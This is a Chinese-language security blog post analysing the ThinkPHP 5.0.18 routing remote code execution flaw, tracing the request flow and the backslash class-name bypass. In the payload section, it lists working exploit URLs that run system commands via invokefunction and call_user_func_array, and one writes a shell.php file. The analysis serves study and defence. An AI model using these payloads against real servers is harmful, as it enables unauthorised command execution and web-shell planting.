---
title: ThinkPHP5路由rce漏洞分析
author: SecureNexusLab
date: 2024-09-15 09:33
cover: true
sidebar: []
readmore: true
tags: 
- 公众号推文
- Web安全
categories:
- 公众号推文
---

## ThinkPHP5路由rce漏洞分析

使用的版本是tp5.0.18

https://github.com/top-think/framework/releases/tag/v5.0.18

https://github.com/top-think/think/releases/tag/v5.0.18

### 路由分析

从index.php开始路由分析，用动态调试的方法来进行路由分析



首先是看index.php

![](/images/ThinkPHP5-rce-analysic/1.png)

再跟到start.php

![](/images/ThinkPHP5-rce-analysic/2.png)

补充一下：App通常是应用程序的主要入口类，run方法通常负责启动应用程序的生命周期。这包括初始化配置、设置路由、加载必要的服务和中间件等。send方法通常用于发送最终的响应到客户端。在大多数Web应用框架中，它会输出HTTP响应内容，如HTML、JSON、文件等，并合理设置HTTP头信息。总的来说就是结合起来，这行代码可以解释为，应用通过 `App::run()` 启动整个应用程序，并在所有处理完成后，通过 `send()` 方法发送结果到客户端。**所以要分析路由的话，我们要跟到run里面去看。**

跟到run里面，这里面就是检测请求的地方了，可以看到这里的输入都有request

![](/images/ThinkPHP5-rce-analysic/3.png)

这里我就不放截图了，放了就过于冗长了，简单审计一下前面的东西。然后直接到重要的这个地方，routeCheck这里就是检测路由的。

![](/images/ThinkPHP5-rce-analysic/4.png)

因为这个dispatch为null，那我们肯定是可以进入这个逻辑的。

![](/images/ThinkPHP5-rce-analysic/5.png)

跟进routecheck

![](/images/ThinkPHP5-rce-analysic/6.png)

可以看到我们的请求路径就在这里被从request请求里面取出来，然后传给了path变量。

然后第二步是从config里面取了个符号`/`出来，用来后面分割我们的路径

![](/images/ThinkPHP5-rce-analysic/7.png)

下一步：检测路由，如果`self::$routeCheck`是null，则从config里面读取配置，默认就为true

![](/images/ThinkPHP5-rce-analysic/8.png)

![](/images/ThinkPHP5-rce-analysic/9.png)

然后看有没有路由的缓存文件，有的话，就包含；没有的话，就从配置里面读路由文件的路径，然后包含。简单的讲，就是去包含一个router.php的文件

![](/images/ThinkPHP5-rce-analysic/10.png)

然后看有没有路由的缓存文件，有的话，就包含；没有的话，就从配置里面读路由文件的路径，然后包含。简单的讲，就是去包含一个router.php的文件

![](/images/ThinkPHP5-rce-analysic/11.png)

这里的Route::check简单的讲就是看你的url是不是匹配到了router.php里面的路由，如果没有匹配到，就走`解析模块/控制器/操作/参数`的逻辑去检测url，匹配到了则就这样。

![](/images/ThinkPHP5-rce-analysic/12.png)

![](/images/ThinkPHP5-rce-analysic/13.png)

我们这里返回的是false显然是不走这个逻辑的

![](/images/ThinkPHP5-rce-analysic/14.png)

最后就走到常规的url的检测逻辑了，也就是最后一步。

![](/images/ThinkPHP5-rce-analysic/15.png)

我们跟进`Route::parseUrl`去看一看。

跟进去之前我们先理一理之前的逻辑

从`index.php`->`start.php`->`App::run()`->`App中的self::routeCheck`->`输入的path没在router.php设置的路由中匹配到`->`最后进入routeCheck中的Route::parseUrl操作`

好现在我们进入`Route::parseUrl`看一下。看是不是绑定了路由，没绑定就不过第一个逻辑，我们这里没绑定就不会过这个逻辑

![](/images/ThinkPHP5-rce-analysic/16.png)

下面这里就把url分割开来了，存在path中按竖线分成了数组中的元素。

![](/images/ThinkPHP5-rce-analysic/17.png)

检测到path存在值之后，就进入下面的解析路由的模块了

![](/images/ThinkPHP5-rce-analysic/18.png)

然后看是否支持多模块，默认支持，则从path中删除第一个元素，然后将删除的第一个元素传输给module。

module下面的if中$autoSearch是从config里取出的，看设置是否自动搜索控制器，默认为false。所以下面这个if不经过。

![](/images/ThinkPHP5-rce-analysic/19.png)

走到下面的else里就是挨个从path数组中取出控制器controller，以及操作action，以及操作后面跟的参数

![](/images/ThinkPHP5-rce-analysic/20.png)

最后两个if逻辑，第一个是看之前绑定的bind里面有没有mudule或者mudule是不是空，如果满足一个条件 -> 则会按照`controller/action`的方式去看之前有没有绑定。通过这样做，可以确保当前请求的URL不会与已定义的路由规则发生冲突，防止重复定义导致路由处理混乱。

![](/images/ThinkPHP5-rce-analysic/21.png)

这两个if逻辑正常访问都是直接过，然后最后就return了一个如下图所示的数组出去

![](/images/ThinkPHP5-rce-analysic/22.png)

![](/images/ThinkPHP5-rce-analysic/23.png)

再理一下，从`index.php`->`start.php`->`App::run()`->`App中的self::routeCheck`->`输入的path没在router.php设置的路由中匹配到`->`最后进入routeCheck中的Route::parseUrl操作`->`parseurl看是否有重复绑定，没有则返回 模块/控制器/操作 的一个数组` 

最后数组返回出来就简单点看看，只看关键的地方，去看一下在哪里调用类的

回到我们最开始的App::run()这里，通过动态调试，得知了最终调用类和方法的地方在这里，`exec`

![](/images/ThinkPHP5-rce-analysic/24.png)

```exec -> module```

![](/images/ThinkPHP5-rce-analysic/25.png)

```exec -> module -> Loader::controller```

![](/images/ThinkPHP5-rce-analysic/26.png)

```exec -> module -> Loader::controller ->class_exists```

![](/images/ThinkPHP5-rce-analysic/27.png)

```exec -> module -> Loader::controller ->class_exists ->存在就__include_file(看了下就是include)```

![](/images/ThinkPHP5-rce-analysic/28.png)

```
exec -> module -> Loader::controller ->class_exists ->存在就__include_file(看了下就是include) -> 刚刚返回true后回到controller 去调用这个class
```

![](/images/ThinkPHP5-rce-analysic/29.png)

```exec -> module -> Loader::controller ->class_exists ->存在就__include_file(看了下就是include) -> 刚刚返回true后回到controller 去调用这个class```

![](/images/ThinkPHP5-rce-analysic/30.png)

最后`App.php:343, think\App::invokeMethod()`这里用反射去调用了我们传入的类的方法，而类就是之前获取到的index类。

![](/images/ThinkPHP5-rce-analysic/31.png)

最后总结一下整个流程就是 `index.php`->`start.php`->`App::run()`->`App中的self::routeCheck`->`输入的path没在router.php设置的路由中匹配到`->`最后进入routeCheck中的Route::parseUrl操作`->`parseurl看是否有重复绑定，没有则返回 模块/控制器/操作 的一个数组`  -> `exec` -> `module` ->`Loader::controller` ->`class_exists` ->`存在就__include_file(看了下就是include)` -> `刚刚返回true后回到controller 去调用这个class` ->`回到module用is_callable看hello方法能否调用，能调用就直接用反射去调用` -> `App.php:331, think\App::invokeMethod()用反射动态调用构造好的类的路径去调用方法`。

简单的讲：如果有controller就直接调用，如果controller传入的方法能调用，就调用。

漏洞点就出来了，如果能调用任意的类，执行任意的方法，就可以rce了，或者就算不是任意类，只要找到一个其他能rce到类就行。

### 漏洞分析

我们回到刚才调用类的地方，如果我们直接传入一个任意类，程序就会默认的给我们拼接为`app\index\controller\Evil`。这里我们仔细看可以看到，controller传入参数的地方，他其实并没有传入module，只传入了controller也就是我们的Evil类。也就是说路径前面的controller肯定是在这里面自己默认加进去的。

![](/images/ThinkPHP5-rce-analysic/32.png)

这样就导致我们，只能进入controller文件夹去调用类，而我们需要调用任意的类，就要从这个构造class变量的方法去入手了。也就是getModuleAndClass这个地方，跟进去看一眼，代码分析我就直接写在注释里面。

```
protected static function getModuleAndClass($name, $layer, $appendSuffix)
{
    if (false !== strpos($name, '\\')) {
        // 如果$name中包含命名空间分隔符'\', 则$name是完整的类名
        $module = Request::instance()->module(); // 获取当前模块名称
        $class  = $name; // 直接使用$name
    } else {
        if (strpos($name, '/')) {
            // 如果$name中包含'/', 则将模块名称和类名分拆
            list($module, $name) = explode('/', $name, 2);
        } else {
            // 如果$name中不包含'/', 当前模块名称为请求的模块名称
            $module = Request::instance()->module();
        }

        // 调用 parseClass 方法生成完整的类名
        $class = self::parseClass($module, $layer, $name, $appendSuffix);
    }

    return [$module, $class]; // 返回模块名称和完整类名
}
```

可以看到如果name带有\符号那就回直接返回。现在我们来看看

**兼容模式**



如果我们直接访问`http://127.0.0.1/public/index.php/\index/\evil/\hello`的话，http协议就会给我们转义掉了。那就没办法在类名中加入反斜线了，这时候我们就要想到thinkphp的兼容模式。

这里就简单介绍一下，这个兼容模式是默认开启的，并且参数默认也是s。

其作用就是假如访问`http://127.0.0.1/public/index.php?s=index/evil/hello`，它的效果和`http://127.0.0.1/public/index.php/index/evil/hello`的效果是一样。用兼容模式去访问的话，就不会被http转义掉我们的反斜线了。

![](/images/ThinkPHP5-rce-analysic/33.png)

如下

![](/images/ThinkPHP5-rce-analysic/34.png)

现在我们再去在参数中加入反斜线

![](/images/ThinkPHP5-rce-analysic/35.png)

成功把`app\index\controller\Evil`变成`\evil`了。

#### 继续

![](/images/ThinkPHP5-rce-analysic/36.png)

刚才说到，我们已经成功把class变成\evil了。就是说我们原来只能去controller里面的东西，现在我们已经绕出来了。

为了包含我们想要的rce的类，这里要说一说php反射的一个点。**php反射只能操作已经声明的类。这是因为反射是基于运行时的元数据来工作的，如果类尚未声明，自然不存在元数据供反射机制使用。**

这里我们就可以在idea的控制台使用`get_declared_classes()`来获取所有已经声明的类

![](/images/ThinkPHP5-rce-analysic/37.png)

![](/images/ThinkPHP5-rce-analysic/38.png)

由于是分析漏洞，我们就不一个一个找了，看这里的一个https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9.md

payload里面用的类来进行分析。

![](/images/ThinkPHP5-rce-analysic/39.png)

```
?s=index/\think\Request/input&filter[]=system&data=pwd
?s=index/\think\view\driver\Php/display&content=<?php phpinfo();?>
?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```

我们就看最后一个payload吧..因为我试了下上面的好像在这个版本都不成功。

可以看到确实是有这个类的

![](/images/ThinkPHP5-rce-analysic/40.png)

找到\think\app/invokefunction。

![](/images/ThinkPHP5-rce-analysic/41.png)

```
public static function invokeFunction($function, $vars = [])
{
    // 使用 ReflectionFunction 类来反射函数
    $reflect = new \ReflectionFunction($function);

    // 绑定参数，确保传入函数的参数与实际参数匹配
    $args = self::bindParams($reflect, $vars);

    // 如果开启了调试模式，记录函数执行的信息
    self::$debug && Log::record('[ RUN ] ' . $reflect->__toString(), 'info');

    // 使用反射对象调用函数，并传入绑定后的参数
    return $reflect->invokeArgs($args);
}
```

简单的讲就是传入一个$function是函数名，另一个数组里面就是函数的参数。所以到这里就很清晰了。

```
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=calc
```

就是用`call_user_func_array`去执行`calc`来弹计算器就行了。

![](/images/ThinkPHP5-rce-analysic/42.png)
